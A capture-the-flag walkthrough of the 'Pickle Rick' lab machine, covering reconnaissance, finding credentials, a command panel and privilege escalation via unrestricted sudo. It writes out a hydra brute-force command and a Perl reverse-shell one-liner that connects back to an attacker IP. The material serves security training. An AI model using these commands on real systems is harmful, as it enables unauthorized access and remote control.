# Pickle Rick

![](<../../.gitbook/assets/image (508).png>)

It seems that we have only one task. I started off with an nmap scan, and looking at the web app:

![](<../../.gitbook/assets/image (425).png>)

Nothing too important on the page itself. I checked out robots.txt to see if there were any directories we were not allowed to see:

![](<../../.gitbook/assets/image (360).png>)

I then went back to the original page, and saw something in the page source code:

![](<../../.gitbook/assets/image (640).png>)

Now we know the username: R1ckRul3s. By this time my nmap scan had completed:

![](<../../.gitbook/assets/image (424) (2).png>)

We see the SSH port and HTTP port. I ran feroxbuster on the target and got the following:

![](<../../.gitbook/assets/image (670).png>)

There isn't too much going on here. I checked out the assets folder:

![](<../../.gitbook/assets/image (641).png>)

Nothing out of the ordinary here either. I did not get anything of use from feroxbuster, but dirbuster had shown me files that I had not seen before:

![](<../../.gitbook/assets/image (601) (1).png>)

![](<../../.gitbook/assets/image (433) (1).png>)

I think I might be able to bruteforce this with hydra. In order to do this, I need to get information about the error message:

![](<../../.gitbook/assets/image (370) (1).png>)

Now we know what the error looks like. We also need to see what the request body looks like. This can be done by looking at the network tab (in the inspector window). In the network tab, if you click on "Header" and then "Resend", then "Edit and Resend", you can see the request body:

![](<../../.gitbook/assets/image (601).png>)

I combined this all with the help of [https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/) to get the following command:

`hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.116.191 http-post-form "/login.php:username=R1ckRul3s&password=^PASS^&sub=Login:Invalid username or password."`

After running **hydra** with multiple different wordlists, I found [this write-up](https://thefluffy007.com/2019/03/14/tryhackme-pickle-rick-ctf/) that made me realize my mistake: I had overlooked that the password was what I had found earlier:&#x20;

![](<../../.gitbook/assets/image (639) (1).png>)

Combining the username and password leads us to this:

![](<../../.gitbook/assets/image (532).png>)

I have access to `ls` and see some interesting files:

![](<../../.gitbook/assets/image (433) (2).png>)

When trying to run `cat` and `more`, I get the following output:

![](<../../.gitbook/assets/image (488).png>)

I want to get a netcat reverse shell onto the system so I will be able to run commands more freely. In order to do this, I used the website [https://www.revshells.com/](https://www.revshells.com/) to make the shell. A lot of them did not work, but this one did:

`perl -e 'use Socket;$i="<MY IP ADDRESS>";$p=4343;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`

I got a shell:

![](<../../.gitbook/assets/image (614).png>)

I finally got the first ingredient:

![](<../../.gitbook/assets/image (665).png>)

The file clue.txt had the following information in it:

![](<../../.gitbook/assets/image (494).png>)

I went to look in the home directory and saw two directories, which led me to the second clue:

![](<../../.gitbook/assets/image (351).png>)

I did not see anything else that stood out, so I ran `sudo -l` to see what I had access to as root:

![](<../../.gitbook/assets/image (324).png>)

Apparently, I can run **any** command as root. I was able to get root:

![](<../../.gitbook/assets/image (715).png>)

I just needed to find the last ingredient. It was in the /root folder:

![](<../../.gitbook/assets/image (672) (2).png>)

That's all that was needed for this machine.
